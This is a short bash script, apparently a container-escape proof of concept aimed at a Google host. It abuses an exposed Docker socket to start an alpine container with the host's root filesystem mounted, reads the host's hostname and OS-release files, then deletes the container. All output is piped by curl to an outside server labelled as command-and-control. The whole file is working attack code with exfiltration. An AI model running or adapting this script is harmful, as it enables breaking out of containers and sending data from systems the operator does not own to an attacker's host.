#!/bin/bash
C2_URL="417a97eeaad6dddf-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE HOST ESCAPE: FINAL EVIDENCE ==="
  
  # 1. Create a container that hangs open for 60 seconds
  # We use the alpine image we just confirmed exists on the host
  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{
      "Image": "alpine:latest",
      "Cmd": ["sleep", "60"],
      "HostConfig": {"Binds": ["/:/host:ro"]}
    }')
  
  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$ID" ]; then
    echo "Container ID: $ID"
    # Start it
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
    
    # 2. Grab the Host Identity Files
    echo "--- HOST HOSTNAME ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/hostname" | tar -xO
    
    echo "--- HOST OS RELEASE ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host/etc/os-release" | tar -xO

    # 3. Cleanup
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
  else
    echo "Failed to create container. Resp: $RESP"
  fi

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
